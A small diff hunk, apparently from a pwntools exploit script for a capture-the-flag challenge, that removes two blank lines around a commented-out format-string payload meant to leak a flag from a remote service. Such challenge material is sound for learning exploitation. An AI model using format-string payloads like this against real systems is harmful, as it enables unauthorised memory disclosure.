@@ -19,8 +19,6 @@ host = "hack.scythe2021.sdslabs.co"
 target=remote(host,port)
 
 # First send this payload, you'll get the first part of the flag
-
-
 #payload = p32(flag1) +('%08x '*6+'%s').encode()
 
 # After you get the first part of the flag, use this payload to get the second part. 
